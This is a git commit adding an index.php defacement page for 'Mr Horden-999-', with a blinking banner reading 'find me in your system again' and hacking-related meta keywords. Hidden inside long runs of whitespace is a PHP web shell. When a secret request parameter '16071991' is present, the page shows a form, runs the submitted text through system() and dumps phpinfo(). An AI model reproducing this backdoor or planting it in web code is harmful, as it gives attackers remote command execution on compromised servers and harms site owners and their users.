d7ba577ea7c4843f62afe14af9b385afca1b492e
PreEdaetor <73938089+PreEdaetor@users.noreply.github.com>
2020-11-22 17:42:26 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,85 @@
+<!DOCTYPE html><html>
+<head><title>Mr Horden-999-</title>
+ <meta name="author" content="Mr Horden"> 
+ <meta name="description" content="Black Demon Cyber">
+ <meta name="keywords" content="horden. Mr Horden, Hordens.xss .SQL .hack .Indonesia .carding .Shell .dork fresh .fresh .github .cara hack .Deface poc .mirror .999 .darurat .site:in .admin .login .inurl .intext .Mr Horden-999- .kapan .film .seri .kakek Sugiono .emak ."/>
+ 
+ <meta name="theme-color" content="#000">
+ <link rel="icon" type="image/png" href="https://thumbs2.imgbox.com/f1/a2/qNdVmUav_t.png">
+<iframe width="0" height="0" src="https://1.top4top.net/m_1414uxu1p0.mp3" frameborder="0" allowfullscreen>
+</iframe></head>
+
+<style type="text/css">
+	body{
+	background-image: url(https://raw.githubusercontent.com/PreEdaetor/bahan_symlink/main/unnamed.gif);
+	background-attachment:fixed;
+	background-repeat:no-repeat;
+	background-position:center;
+	background-color:transparan;
+	-webkit-background-size: 100% 100%;
+	
+	}
+	
+	h1 {
+		text-decoration: blink; 
+	}
+	.blink {
+  animation: blink-animation 0,1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 0.1s steps(5, start) infinite;
+  margin: auto;
+  margin-top: 25px;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+</style>
+<body>
+
+<center>
+	<br>
+	
+	<br><br><br><br><br><br><br>
+                                                                                                                                                                             	
+                                                                                                                                                                             	<br><br><br><br><br><br><br><?php
+                                                                                                                                                               	if(isset($_REQUEST['16071991'])){
+	echo "<pre>";
+	echo "<form name='form' action='#' method='post'>
+	<input type='text' name='coba'/> <input type='submit' value='enter'/>
+	</form>";
+                                                                                                                                                                                            	$cmd = ($_POST['coba']);
+                                                                                                   	system($cmd);
+	echo "</pre>";
+	phpinfo();
+	die;
+	}
+	
+	?>
+	
+	
+	<br>
+	<br>
+	<br>
+	<br>
+	<center>
+	<img src="https://i.ibb.co/6n8knmh/Horden.jpg" widht="50%" height="50%" 
+	style="box-shadow: 0px 0px 20px #ffe185; background-color: red; margin: auto;">
+</center>
+<center>
+	<h1 class="blink"><font color="yellow" size="20" style="font-family: Bookman Old Style, serif; text-shadow:5px 5px 20px #ffc000;">  Mr Horden-999- </font></h1> 
+<h1 class="blink"><font color="white" size="7" style="font-family: Bookman Old Style, serif; text-shadow:5px 5px 10px white;">find me in your system again</font></h1>
+</center>
+<center>
+<h1 class="blink"><font color="red" size="20" style="font-family: Bookman Old Style, serif; text-shadow:5px 5px 20px pink;"> -----BLACK DEMONSTRATION CYBER----- </font></h1> 
+
+</center>
+
+
+</body>
+</html>
